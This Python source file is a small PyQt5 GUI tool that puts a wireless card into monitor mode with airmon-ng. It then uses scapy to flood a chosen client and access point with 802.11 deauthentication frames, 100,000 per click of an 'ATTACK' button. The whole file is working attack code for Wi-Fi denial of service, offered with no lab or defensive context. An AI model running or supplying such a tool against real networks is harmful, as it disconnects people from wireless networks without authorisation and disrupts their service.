import sys
from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QTextEdit, QLabel
from PyQt5 import QtGui
from PyQt5.QtCore import pyqtSlot
import time
from scapy.all import *
from subprocess import call
from subprocess import check_output
import re

iface = "wlan0mon"
timeout = 1
#dest = "94:65:2D:D8:2E:16"
#bssid = "40:F2:01:9A:42:56"



def setMonitorMode():
	checkphrase_mon_success = "monitor mode vif enabled"
	checkphrase_mon = "Mode:Monitor"

	moncheck = check_output(["iwconfig"],stderr=subprocess.PIPE).decode("UTF-8") #stderr=subprocess.PIPE simply "silences" the output.

	if checkphrase_mon in moncheck:
		print("wlan0mon is already in Monitor Mode!")

	else:
		airmoncheck = check_output(["airmon-ng", "start", "wlan0"],stderr=subprocess.PIPE).decode("UTF-8")
		if checkphrase_mon_success in airmoncheck:
			print("Sucessfully set wlan0 to Monitor Mode (now called wlan0mon)!")
		else:
			raise SystemExit("wlan0 has not entered Monitor Mode, recheck.")




def perform_deauth_attack(interface,dest,bssid,amount):
	"""
	interface, is the wireless interface
	destination is the target we wish to deuath
	bssid is the mac address of the AP. (string, MAC)

	:param interface:
	:param dest:
	:param bssid:
	:return:
	"""
	radio_p = RadioTap()
	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
	frame = radio_p/dot11_frame/deauth

	#hexdump(frame)
	#ls(frame)
	#frame.summary()

	sendp(frame,iface=interface, count=amount,inter=0.02) #'wlan0mon'


setMonitorMode()
#perform_deauth_attack(iface,dest,bssid,1)
class App(QMainWindow):
	def __init__(self):
		super().__init__()
		self.title = "hello there"
		self.setupUI()

	def setupUI(self):
		self.setWindowTitle(self.title)
		self.setGeometry(50,50,700,700)


		#MAC AP
		self.textboxAP = QLineEdit(self)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textboxAP.move(20,40)
		self.textboxAP.resize(280, 40)
		#MAC TARGET
		self.textbox = QLineEdit(self)
		self.textbox.setPlaceholderText("Enter the target MAC address")
		self.textbox.move(20,100)
		self.textbox.resize(280,40)


		##ATTACK button
		self.attackbutton = QPushButton('ATTACK',self)
		self.attackbutton.resize(200,50)
		self.attackbutton.move(350,65)
		self.attackbutton.clicked.connect(self.on_attackclick)





		self.show()
	@pyqtSlot()
	def on_attackclick(self):
		self.textboxAP.setEnabled(False)
		self.textbox.setEnabled(False)
		bssid_targetMAC = self.textboxAP.text() #string
		destMAC = self.textbox.text() #string
		print(bssid_targetMAC)
		print(destMAC)
		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match
		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()):#checks if both inputs are valid MAC addreses (just format)
			perform_deauth_attack(iface, destMAC, bssid_targetMAC, 100000)



		else:
			self.textboxAP.setPlaceholderText("Enter valid AP MAC address")
			self.textbox.setPlaceholderText("Enter valid destination MAC address")
			self.textboxAP.setEnabled(True)
			self.textbox.setEnabled(True)
			self.textbox.clear()
			self.textboxAP.clear()


if __name__ == '__main__':
	app = QApplication(sys.argv)
	ex = App()
	sys.exit(app.exec_())
